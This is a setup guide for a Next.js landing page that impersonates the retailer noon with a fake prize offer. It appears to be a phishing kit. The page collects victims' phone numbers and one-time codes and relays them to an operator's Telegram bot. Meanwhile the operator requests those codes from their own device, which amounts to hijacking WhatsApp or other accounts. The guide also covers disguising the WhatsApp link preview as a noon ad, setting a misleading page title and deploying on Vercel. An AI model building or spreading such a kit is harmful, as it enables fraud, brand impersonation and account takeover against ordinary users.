# noon Gift Verify — Setup Guide

A mobile-first Next.js landing page with manual OTP verification through Telegram + WhatsApp admin flow.

---

## 📁 Project Structure

```
noon-gift/
├── app/
│   ├── api/notify/route.ts   ← Telegram notification API
│   ├── globals.css           ← noon yellow theme
│   ├── layout.tsx            ← SEO + WhatsApp OG meta tags
│   └── page.tsx              ← Main landing page
├── images/                   ← Page/preview images
│   ├── banner.png            ← Hero banner image
│   ├── img1.png              ← Prize/iPhone image
│   └── img9.jpeg             ← Social preview image
├── .env.local.example        ← Copy this to .env.local
└── package.json
```

---

## 🖼️ Adding Your Images

1. Copy your banner image → `public/banner.jpg`
2. Copy your prize image (iPhone, etc.) → `public/prize.png`
3. For WhatsApp preview: create a **1200×630px** image → `public/og-banner.jpg`
   - This is what appears when the link is shared on WhatsApp
   - Should look like the noon ad card (yellow background, noon logo, title text)
4. Add noon logo → `public/noon-logo.png`

---

## ⚙️ Environment Setup

Copy `.env.local.example` to `.env.local` and fill in:

### Telegram Bot Setup
1. Open Telegram → search `@BotFather`
2. Send `/newbot` and follow prompts → copy the **Bot Token**
3. To get your **Chat ID**:
   - Start a chat with your bot (send it `/start`)
   - Visit: `https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates`
   - Find `"chat":{"id": XXXXXXX}` — that's your Chat ID
4. Add both to `.env.local`

```env
TELEGRAM_BOT_TOKEN=7xxxxxxxxx:AAF...
TELEGRAM_CHAT_ID=123456789
NEXT_PUBLIC_SITE_URL=https://your-project.vercel.app
```

---

## 🚀 Local Development

```bash
npm install
npm run dev
# Open http://localhost:3000
```

---

## ☁️ Deploy to Vercel

1. Push this folder to a GitHub repo
2. Go to [vercel.com](https://vercel.com) → New Project → Import your repo
3. In Vercel project settings → **Environment Variables** add:
   - `TELEGRAM_BOT_TOKEN`
   - `TELEGRAM_CHAT_ID`
   - `NEXT_PUBLIC_SITE_URL` (set to your final Vercel domain)
4. Deploy!
5. Copy your Vercel URL (e.g. `https://noon-gift-xyz.vercel.app`)
6. Update `NEXT_PUBLIC_SITE_URL` to the same URL in Vercel env vars
7. Redeploy once after env update

---

## 📱 WhatsApp Link Preview

When you share the Vercel URL on WhatsApp it will show:
- **Image**: `/public/og-banner.jpg` (make it look like the noon ad)
- **Title**: "Dash Cameras Oman | Best Price Offers | Muscat, Seeb"
- **Description**: "Biggest selection of Dash Cameras in Oman ✓ Secure Shopping..."

To edit the preview text, update `app/layout.tsx` → `metadata.openGraph`.

> **Note**: WhatsApp caches previews. To force refresh, use the WhatsApp Link Preview Debugger or share via a different link.

---

## 🔄 How It Works

```
User enters phone
      ↓
Frontend calls /api/notify → Telegram Bot notifies admin instantly
      ↓
Admin triggers OTP manually from their own device (e.g. WhatsApp/order verification)
      ↓
User enters 6-digit OTP
      ↓
Frontend sends OTP to /api/notify → Telegram Bot forwards OTP to admin
      ↓
Site shows "sent to admin / verification in progress"
```

---

## 🛠️ Customization

| What to change | Where |
|---|---|
| Page title & WhatsApp preview text | `app/layout.tsx` → `metadata` |
| Prize description & text | `app/page.tsx` → prizeTitle, prizeDesc |
| Yellow color shade | `app/globals.css` → `--noon-yellow` |
| Country code default | `app/page.tsx` → `formatPhone()` function |
| Success message | `app/page.tsx` → step === "submitted" section |
# noon-gift
# noon-gift
